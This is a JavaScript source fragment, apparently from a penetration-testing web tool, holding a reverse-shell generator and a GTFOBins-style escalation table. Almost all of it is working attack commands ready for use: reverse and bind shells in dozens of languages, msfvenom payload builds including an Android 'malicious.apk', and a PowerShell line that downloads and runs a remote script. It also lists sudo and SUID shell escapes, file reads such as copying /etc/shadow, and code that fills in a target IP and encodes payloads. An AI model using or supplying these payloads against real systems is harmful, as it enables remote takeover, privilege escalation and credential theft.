    {name:'Bash UDP',lang:'Bash',os:'linux',cmd:'{shell} -i >& /dev/udp/{ip}/{port} 0>&1'},
    {name:'nc mkfifo',lang:'Netcat',os:'linux',cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'},
    {name:'nc -e',lang:'Netcat',os:'linux',cmd:'nc {ip} {port} -e {shell}'},
    {name:'nc.exe -e',lang:'Netcat',os:'windows',cmd:'nc.exe {ip} {port} -e {shell}'},
    {name:'BusyBox nc -e',lang:'Netcat',os:'linux',cmd:'busybox nc {ip} {port} -e {shell}'},
    {name:'nc -c',lang:'Netcat',os:'linux',cmd:'nc -c {shell} {ip} {port}'},
    {name:'ncat -e',lang:'Netcat',os:'linux',cmd:'ncat {ip} {port} -e {shell}'},
    {name:'ncat UDP',lang:'Netcat',os:'linux',cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f'},
    {name:'PHP exec',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");\''},
    {name:'PHP shell_exec',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");\''},
    {name:'PHP system',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");\''},
    {name:'PHP passthru',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");\''},
    {name:'PHP popen',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");\''},
    {name:'PHP proc_open',lang:'PHP',os:'linux',cmd:'php -r \'$s=fsockopen("{ip}",{port});proc_open("{shell}",[$s,$s,$s],$p);\''},
    {name:'PHP cmd small',lang:'PHP',os:'any',cmd:'<?=`$_GET[0]`?>'},
    {name:'Python #1',lang:'Python',os:'linux',cmd:'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")\''},
    {name:'Python #2',lang:'Python',os:'linux',cmd:'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")\''},
    {name:'Python3 #1',lang:'Python',os:'linux',cmd:'export RHOST="{ip}";export RPORT={port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")\''},
    {name:'Python3 #2',lang:'Python',os:'linux',cmd:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")\''},
    {name:'Python3 shortest',lang:'Python',os:'linux',cmd:'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")\''},
    {name:'Perl',lang:'Perl',os:'linux',cmd:'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};\''},
    {name:'Perl no sh',lang:'Perl',os:'linux',cmd:'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''},
    {name:'Ruby #1',lang:'Ruby',os:'linux',cmd:'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))\''},
    {name:'Ruby no sh',lang:'Ruby',os:'linux',cmd:'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\''},
    {name:'PowerShell #1',lang:'PowerShell',os:'windows',cmd:'$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'},
    {name:'PowerShell #2',lang:'PowerShell',os:'windows',cmd:'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'},
    {name:'PowerShell #3',lang:'PowerShell',os:'windows',cmd:'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{ip}\', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"'},
    {name:'Windows ConPty',lang:'PowerShell',os:'windows',cmd:'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}'},
    {name:'Socat #1',lang:'Socat',os:'linux',cmd:'socat TCP:{ip}:{port} EXEC:{shell}'},
    {name:'Socat #2 TTY',lang:'Socat',os:'linux',cmd:'socat TCP:{ip}:{port} EXEC:\'{shell}\',pty,stderr,setsid,sigint,sane'},
    {name:'Java Runtime',lang:'Java',os:'linux',cmd:'Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{"{shell}","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"}); p.waitFor();'},
    {name:'Java Socket',lang:'Java',os:'any',cmd:'import java.io.*;import java.net.*;class S{public static void main(String[] a)throws Exception{Socket s=new Socket("{ip}",{port});Process p=new ProcessBuilder("{shell}").redirectErrorStream(true).start();InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}p.destroy();s.close();}}'},
    {name:'Node.js',lang:'Node.js',os:'linux',cmd:'require(\'child_process\').exec(\'nc -e {shell} {ip} {port}\')'},
    {name:'Node.js #2',lang:'Node.js',os:'any',cmd:'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("{shell}",[]);var client=new net.Socket();client.connect({port},{ip},function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'},
    {name:'Golang',lang:'Go',os:'linux',cmd:'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'},
    {name:'Lua #1',lang:'Lua',os:'linux',cmd:'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'{shell} -i <&3 >&3 2>&3\');"'},
    {name:'Lua #2',lang:'Lua',os:'linux',cmd:'lua5.1 -e \'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\''},
    {name:'Awk',lang:'Awk',os:'linux',cmd:'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'},
    {name:'Telnet',lang:'Telnet',os:'linux',cmd:'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF'},
    {name:'Zsh',lang:'Zsh',os:'linux',cmd:'zsh -c \'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''},
    {name:'cURL',lang:'cURL',os:'linux',cmd:'C=\'curl -Ns telnet://{ip}:{port}\'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null'},
    {name:'OpenSSL',lang:'OpenSSL',os:'linux',cmd:'mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s'},
    {name:'SQLite3',lang:'SQLite3',os:'linux',cmd:'sqlite3 /dev/null \'.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f\''},
    {name:'Rustcat',lang:'Rustcat',os:'linux',cmd:'rcat connect -s {shell} {ip} {port}'},
    {name:'Groovy',lang:'Groovy',os:'windows',cmd:'String host="{ip}";int port={port};String cmd="{shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);};p.destroy();s.close();'},
    {name:'Dart',lang:'Dart',os:'any',cmd:'import \'dart:io\';import \'dart:convert\';main(){Socket.connect("{ip}",{port}).then((socket){Process.start("{shell}",[]).then((process){process.stdout.transform(utf8.decoder).listen((data){socket.write(data);});process.stderr.transform(utf8.decoder).listen((data){socket.write(data);});socket.listen((data){process.stdin.add(data);});});});}'},
],
bind: [
    {name:'nc -e Bind',lang:'Netcat',os:'linux',cmd:'nc -nlvp {port} -e {shell}'},
    {name:'nc mkfifo Bind',lang:'Netcat',os:'linux',cmd:'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | {shell} -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f'},
    {name:'ncat -e Bind',lang:'Netcat',os:'linux',cmd:'ncat -nlvp {port} -e {shell}'},
    {name:'Perl Bind',lang:'Perl',os:'linux',cmd:'perl -e \'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("{shell} -i");};\''},
    {name:'PHP Bind',lang:'PHP',os:'any',cmd:'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}\''},
    {name:'Python3 Bind',lang:'Python',os:'any',cmd:'python3 -c \'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")\''},
    {name:'Ruby Bind',lang:'Ruby',os:'linux',cmd:'ruby -rsocket -e \'f=TCPServer.new({port}); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec "{shell} -i"\''},
    {name:'Socat TTY Bind',lang:'Socat',os:'linux',cmd:'socat TCP-LISTEN:{port},reuseaddr,fork EXEC:{shell},pty,stderr,setsid,sigint,sane'},
],
msfvenom: [
    {name:'Windows Meterpreter Staged (x64)',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe'},
    {name:'Windows Meterpreter Stageless (x64)',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe'},
    {name:'Windows Shell Staged (x64)',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe'},
    {name:'Windows Shell Stageless (x64)',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe'},
    {name:'Linux Meterpreter Staged (x64)',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf'},
    {name:'Linux Shell Stageless (x64)',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf'},
    {name:'PHP Meterpreter',lang:'MSFVenom',os:'any',cmd:'msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php'},
    {name:'PHP Reverse',lang:'MSFVenom',os:'any',cmd:'msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php'},
    {name:'JSP Reverse',lang:'MSFVenom',os:'any',cmd:'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp'},
    {name:'WAR Reverse',lang:'MSFVenom',os:'any',cmd:'msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war'},
    {name:'ASPX Meterpreter (x64)',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx'},
    {name:'Python Reverse',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw'},
    {name:'Bash Reverse',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh'},
    {name:'macOS Meterpreter (x64)',lang:'MSFVenom',os:'mac',cmd:'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho'},
    {name:'macOS Shell Stageless (x64)',lang:'MSFVenom',os:'mac',cmd:'msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho'},
    {name:'Android Meterpreter',lang:'MSFVenom',os:'android',cmd:'msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk'},
],
listeners: [
    {name:'nc listener',lang:'Netcat',os:'linux',cmd:'nc -lvnp {port}'},
    {name:'ncat listener',lang:'Netcat',os:'linux',cmd:'ncat -lvnp {port}'},
    {name:'ncat SSL listener',lang:'Netcat',os:'linux',cmd:'ncat --ssl -lvnp {port}'},
    {name:'rlwrap nc',lang:'Netcat',os:'linux',cmd:'rlwrap -cAr nc -lvnp {port}'},
    {name:'socat listener',lang:'Socat',os:'linux',cmd:'socat -d -d TCP-LISTEN:{port} STDOUT'},
    {name:'socat TTY listener',lang:'Socat',os:'linux',cmd:'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'},
    {name:'OpenSSL listener',lang:'OpenSSL',os:'linux',cmd:'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}'},
    {name:'pwncat',lang:'Python',os:'linux',cmd:'python3 -m pwncat -lp {port}'},
    {name:'pwncat (Windows)',lang:'Python',os:'linux',cmd:'python3 -m pwncat -m windows -lp {port}'},
    {name:'msfconsole',lang:'Metasploit',os:'any',cmd:'msfconsole -q -x "use multi/handler; set payload generic/shell_reverse_tcp; set lhost {ip}; set lport {port}; exploit"'},
    {name:'ConPty listener',lang:'Netcat',os:'linux',cmd:'stty raw -echo; (stty size; cat) | nc -lvnp {port}'},
]
};

let selectedShell = null;
function switchRsTab(tab) {
    activeRsTab = tab;
    document.querySelectorAll('#rs-tabs .tab').forEach(t => t.classList.remove('active'));
    document.querySelector(`#rs-tabs .tab[onclick*="${tab}"]`).classList.add('active');
    selectedShell = null;
    renderShellList();
}
function renderShellList() {
    const list = $('rs-list');
    const search = ($('rs-search').value || '').toLowerCase();
    const items = RS_DATA[activeRsTab] || [];
    list.innerHTML = items.filter(s => !search || s.name.toLowerCase().includes(search) || s.lang.toLowerCase().includes(search))
        .map((s, i) => `<div class="rs-item${selectedShell === s ? ' selected' : ''}" onclick="selectShell(RS_DATA['${activeRsTab}'][${i}])">
            <div><div class="rs-name">${esc(s.name)}</div><div class="rs-lang">${esc(s.lang)} &middot; ${esc(s.os)}</div></div>
            <span class="badge badge-blue">${esc(s.lang)}</span>
        </div>`).join('');
}
function selectShell(s) { selectedShell = s; renderShellList(); renderPayload(); $('rs-selected-name').textContent = s.name + ' (' + s.lang + ')'; }
function renderPayload() {
    if (!selectedShell) return;
    let p = selectedShell.cmd.replace(/\{ip\}/g, $('rs-ip').value).replace(/\{port\}/g, $('rs-port').value).replace(/\{shell\}/g, $('rs-shell').value);
    if ($('rs-b64').checked) p = btoa(p);
    if ($('rs-urlencode').checked) p = encodeURIComponent(p);
    $('rs-output').textContent = p;
}
function filterShells() { renderShellList(); }
function copyPayload() { if ($('rs-output').textContent) copyText($('rs-output').textContent); }
function sendPayloadToTerm() { if ($('rs-output').textContent) termExec($('rs-output').textContent); }
['rs-ip','rs-port','rs-shell'].forEach(id => $(id).addEventListener('change', renderPayload));
renderShellList();

// ===== GTFOBins DATA =====
const GTFO = [
{name:'bash',cats:{shell:'bash -p',suid:'bash -p',sudo:'sudo bash',capabilities:'bash -c \'import os; os.setuid(0); exec "/bin/sh"\'','file-read':'bash -c \'echo "$(</path/to/file)"\'','file-write':'bash -c \'echo DATA > /path/to/file\'','reverse-shell':'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'}},
{name:'python',cats:{shell:'python -c \'import os; os.execl("/bin/sh", "sh")\'',suid:'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',sudo:'sudo python -c \'import os; os.execl("/bin/sh", "sh")\'',capabilities:'python -c \'import os; os.setuid(0); os.execl("/bin/sh", "sh")\'','file-read':'python -c \'print(open("/path/to/file").read())\'','file-write':'python -c \'open("/path/to/file","w+").write("DATA")\'','reverse-shell':'python -c \'import sys,socket,os,pty;s=socket.socket();s.connect(("ATTACKER",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\''}},
{name:'perl',cats:{shell:'perl -e \'exec "/bin/sh"\'',sudo:'sudo perl -e \'exec "/bin/sh"\'',capabilities:'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"\'','file-read':'perl -ne print /path/to/file','reverse-shell':'perl -e \'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''}},
{name:'ruby',cats:{shell:'ruby -e \'exec "/bin/sh"\'',sudo:'sudo ruby -e \'exec "/bin/sh"\'',capabilities:'ruby -e \'Process::Sys.setuid(0); exec "/bin/sh"\'','file-read':'ruby -e \'puts File.read("/path/to/file")\'','file-write':'ruby -e \'File.open("/path/to/file", "w+") { |f| f.write("DATA") }\'','reverse-shell':'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("ATTACKER",PORT);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''}},
{name:'php',cats:{shell:'php -r \'system("/bin/sh -i");\'',suid:'php -r \'pcntl_exec("/bin/sh", ["-p"]);\'',sudo:'sudo php -r \'system("/bin/sh -i");\'',capabilities:'php -r \'posix_setuid(0); system("/bin/sh -i");\'','file-read':'php -r \'readfile("/path/to/file");\'','file-write':'php -r \'file_put_contents("/path/to/file", "DATA");\'','reverse-shell':'php -r \'$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i 0<&3 1>&3 2>&3");\''}},
{name:'node',cats:{shell:'node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'',suid:'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})\'',sudo:'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'',capabilities:'node -e \'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'','file-read':'node -e \'process.stdout.write(require("fs").readFileSync("/path/to/file"))\'','file-write':'node -e \'require("fs").writeFileSync("/path/to/file", "DATA")\'','reverse-shell':'node -e \'sh=require("child_process").spawn("/bin/sh");require("net").connect(PORT,"ATTACKER",function(){this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this)})\''}},
{name:'lua',cats:{shell:'lua -e \'os.execute("/bin/sh")\'',sudo:'sudo lua -e \'os.execute("/bin/sh")\'','file-read':'lua -e \'local f=io.open("/path/to/file", "rb"); io.write(f:read("*a")); io.close(f);\'','file-write':'lua -e \'local f=io.open("/path/to/file", "wb"); f:write("DATA"); io.close(f);\'','reverse-shell':'lua -e \'require("socket");require("os");t=socket.tcp();t:connect("ATTACKER",PORT);os.execute("/bin/sh -i <&3 >&3 2>&3")\''}},
{name:'vi',cats:{shell:'vi -c \':!/bin/sh\' /dev/null',suid:'vi -c \':set shell=/bin/sh\\ -p | shell\'',sudo:'sudo vi -c \':!/bin/sh\' /dev/null','file-read':'vi /path/to/file'}},
{name:'vim',cats:{shell:'vim -c \':!/bin/sh\'',suid:'vim -c \':set shell=/bin/sh\\ -p | shell\'',sudo:'sudo vim -c \':!/bin/sh\'','file-read':'vim /path/to/file','file-write':'vim -c \':redir! >/path/to/file | echo "DATA" | redir END | q\''}},
{name:'nano',cats:{shell:'nano\n^R^X\nreset; sh 1>&0 2>&0',suid:'nano -s \'/bin/sh -p\'\n/bin/sh -p\n^T^T',sudo:'sudo nano\n^R^X\nreset; sh 1>&0 2>&0','file-read':'nano /path/to/file'}},
{name:'find',cats:{shell:'find . -exec /bin/sh \\; -quit',suid:'find . -exec /bin/sh -p \\; -quit',sudo:'sudo find . -exec /bin/sh \\; -quit','file-read':'find /path/to/file -exec cat {} \\;','file-write':'find / -fprintf /path/to/file DATA -quit'}},
{name:'awk',cats:{shell:'awk \'BEGIN {system("/bin/sh")}\'',sudo:'sudo awk \'BEGIN {system("/bin/sh")}\'','file-read':'awk \'//' + '/ /path/to/file\'','file-write':'awk \'BEGIN { print "DATA" > "/path/to/file" }\'','reverse-shell':'gawk \'BEGIN {s="/inet/tcp/0/ATTACKER/PORT";while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;while (c && (c |& getline) > 0) print $0 |& s; close(c)}}\''}},
{name:'sed',cats:{shell:'sed -n \'1e exec /bin/sh 1>&0\' /etc/hosts',sudo:'sudo sed -n \'1e exec /bin/sh 1>&0\' /etc/hosts','file-read':'sed \'\' /path/to/file','file-write':'sed -n \'1s/.*/DATA/w /path/to/file\' /etc/hosts'}},
{name:'less',cats:{shell:'less /etc/hosts\n!/bin/sh',sudo:'sudo less /etc/hosts\n!/bin/sh','file-read':'less /path/to/file'}},
{name:'more',cats:{shell:'more /etc/hosts\n!/bin/sh',sudo:'sudo more /etc/hosts\n!/bin/sh','file-read':'more /path/to/file'}},
{name:'man',cats:{shell:'man man\n!/bin/sh',sudo:'sudo man man\n!/bin/sh'}},
{name:'nmap',cats:{shell:'nmap --interactive\n!/bin/sh',sudo:'sudo nmap --interactive\n!/bin/sh','file-read':'nmap -iL /path/to/file','file-write':'nmap -oG=/path/to/file DATA'}},
{name:'nc',cats:{'reverse-shell':'nc -e /bin/sh ATTACKER PORT','file-read':'nc ATTACKER PORT < /path/to/file'}},
{name:'socat',cats:{shell:'socat - exec:/bin/sh,pty,ctty,raw,echo=0',suid:'socat - \'exec:/bin/sh -p,pty,ctty,raw,echo=0\'',sudo:'sudo socat - exec:/bin/sh,pty,ctty,raw,echo=0','file-read':'socat -u file:/path/to/file -','file-write':'socat -u \'exec:echo DATA\' open:/path/to/file,creat','reverse-shell':'socat tcp-connect:ATTACKER:PORT exec:/bin/sh,pty,stderr,setsid,sigint,sane'}},
{name:'curl',cats:{sudo:'sudo curl file:///path/to/file','file-read':'curl file:///path/to/file'}},
{name:'wget',cats:{shell:'echo -e \'#!/bin/sh\\n/bin/sh 1>&0\' >/tmp/x\\nchmod +x /tmp/x\\nwget --use-askpass=/tmp/x 0',sudo:'sudo wget --use-askpass=/tmp/x 0','file-read':'wget -q http://ATTACKER -O /path/to/file'}},
{name:'tar',cats:{shell:'tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',sudo:'sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'}},
{name:'zip',cats:{shell:'zip /tmp/x /etc/hosts -T -TT \'/bin/sh #\'',sudo:'sudo zip /tmp/x /etc/hosts -T -TT \'/bin/sh #\''}},
{name:'gdb',cats:{shell:'gdb -nx -ex \'!/bin/sh\' -ex quit',sudo:'sudo gdb -nx -ex \'!/bin/sh\' -ex quit',capabilities:'gdb -nx -ex \'python import os; os.setuid(0)\' -ex \'!/bin/sh\' -ex quit','file-write':'gdb -nx -ex \'dump value /path/to/file "DATA"\' -ex quit'}},
{name:'ed',cats:{shell:'ed\n!/bin/sh\nq',sudo:'sudo ed\n!/bin/sh\nq','file-read':'ed /path/to/file\n,p\nq'}},
{name:'expect',cats:{shell:'expect -c \'spawn /bin/sh;interact\'',suid:'expect -c \'spawn /bin/sh -p;interact\'',sudo:'sudo expect -c \'spawn /bin/sh;interact\''}},
{name:'ssh',cats:{shell:'ssh localhost /bin/sh',sudo:'sudo ssh -o ProxyCommand=\';/bin/sh 0<&2 1>&2\' x'}},
{name:'docker',cats:{shell:'docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh',sudo:'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh'}},
{name:'env',cats:{shell:'env /bin/sh',suid:'env /bin/sh -p',sudo:'sudo env /bin/sh'}},
{name:'git',cats:{shell:'PAGER=\'/bin/sh -c "exec sh 0<&1"\' git -p help',sudo:'sudo PAGER=\'/bin/sh -c "exec sh 0<&1"\' git -p help','file-read':'git diff /dev/null /path/to/file'}},
{name:'openssl',cats:{'file-read':'openssl enc -in /path/to/file','file-write':'echo DATA | openssl enc -out /path/to/file','reverse-shell':'mkfifo /tmp/s; /bin/sh -i </tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:PORT >/tmp/s'}},
{name:'cp',cats:{suid:'cp --attributes-only --preserve=all /path/to/suid /path/to/target',sudo:'sudo cp /etc/shadow /tmp/shadow','file-read':'cp /path/to/file /dev/stdout','file-write':'echo DATA | cp /dev/stdin /path/to/file'}},
{name:'dd',cats:{'file-read':'dd if=/path/to/file','file-write':'echo DATA | dd of=/path/to/file'}},
{name:'tee',cats:{sudo:'echo DATA | sudo tee /path/to/file','file-write':'echo DATA | tee /path/to/file'}},
{name:'cat',cats:{'file-read':'cat /path/to/file'}},
{name:'sqlite3',cats:{shell:'sqlite3 /dev/null \'.shell /bin/sh\'',sudo:'sudo sqlite3 /dev/null \'.shell /bin/sh\'','file-read':'sqlite3 << EOF\nCREATE TABLE x(x TEXT);\n.import /path/to/file x\nSELECT * FROM x;\nEOF','file-write':'sqlite3 /dev/null -cmd \'.output /path/to/file\' \'select "DATA";\''}},
{name:'screen',cats:{shell:'screen',sudo:'sudo screen','file-write':'screen -L -Logfile /path/to/file echo DATA'}},
{name:'tmux',cats:{shell:'tmux -c /bin/sh',sudo:'sudo tmux -c /bin/sh'}},
{name:'strace',cats:{shell:'strace -o /dev/null /bin/sh',suid:'strace -o /dev/null /bin/sh -p',sudo:'sudo strace -o /dev/null /bin/sh'}},
